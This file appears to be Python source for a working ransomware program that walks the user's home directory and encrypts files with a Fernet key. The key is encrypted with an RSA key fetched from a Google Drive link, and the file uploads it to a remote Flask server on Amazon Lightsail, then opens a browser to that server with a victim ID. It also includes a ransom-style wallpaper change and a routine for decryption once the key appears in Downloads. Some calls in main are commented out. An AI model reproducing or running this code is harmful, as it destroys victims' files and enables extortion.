from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import requests, webbrowser, os, uuid, time, ctypes, threading, sys
from urllib import request

class Ransomware:
    def __init__(self):
        self.key = None
        self.crypter = None
        self.publickey = None
        self.sysRoot = os.path.expanduser('~')
        self.uuid = str(uuid.uuid4())

    def generate_key(self):
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def encrypt_fernet_key(self):
        fernet_key=self.key
        with open('fernet_key.txt', 'wb') as key_file:
            file_name, headers  = request.urlretrieve("https://drive.google.com/u/0/uc?id=1SIDPWxHIfuASvuhzR5jsgjfTn_zdIWzu&export=download", "public.pem")
            public = open(file_name).read()
            self.public_key = RSA.import_key(public)
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            key_file.write(enc_fernent_key)
        requests.post(url=f'https://flaskapp.2tc50a7lpm7cm.eu-west-3.cs.amazonlightsail.com/upload_key?uuid={self.uuid}', files={self.uuid + ".txt": open('fernet_key.txt', 'rb')})
        os.remove('fernet_key.txt')
        self.key = enc_fernent_key
        self.crypter = None
    
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                try:
                    _data = self.crypter.encrypt(data)
                except:
                    _data = data
            else:
                _data = self.crypter.decrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)
    
    def crypt_system(self, encrypted=False):
        system = os.walk(self.sysRoot, topdown=True)
        for root, dir, files in system:
            if "Crypto" in dir:
                dir.remove("Crypto")
            if "Cipher" in dir:
                dir.remove("Cipher")
            for file in files:
                file_path = os.path.join(root, file)
                if file == "malware.exe" or file == sys.argv[0] or file.split('.')[-1] in ['py','pyd','pyw']:
                    continue
                try:
                    if not encrypted:
                        self.crypt_file(file_path)
                    else:
                        self.crypt_file(file_path, encrypted=True)
                    print(f"Encrypted {file_path}")
                except:
                    print(f"Couldn't encrypt {file_path}")
                    continue
    
    def open_browser(self):
        webbrowser.open(f"https://flaskapp.2tc50a7lpm7cm.eu-west-3.cs.amazonlightsail.com?uuid={self.uuid}")

    def detecting_decryption(self):
        while True:
            try:
                with open(f'{self.sysRoot}/Downloads/{self.uuid}.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    ctypes.windll.user32.MessageBoxW(0, "Decrypting your computer...", "Project.exe running", 1)
                    self.crypt_system(encrypted=True)
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(10)

    def change_desktop_background(self):
        path , headers = request.urlretrieve('https://i.ibb.co/thnfCGc/Untitled-1.png')
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def popup(self):
        ctypes.windll.user32.MessageBoxW(0, "Encrypting your computer...", "Project.exe running", 1)

def main():
    rw = Ransomware()
    rw.popup()
    rw.generate_key()
    #rw.crypt_system()
    rw.encrypt_fernet_key()
    rw.open_browser()
    #rw.change_desktop_background()

    #search_key = threading.Thread(target=rw.detecting_decryption)
    #search_key.start()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(e)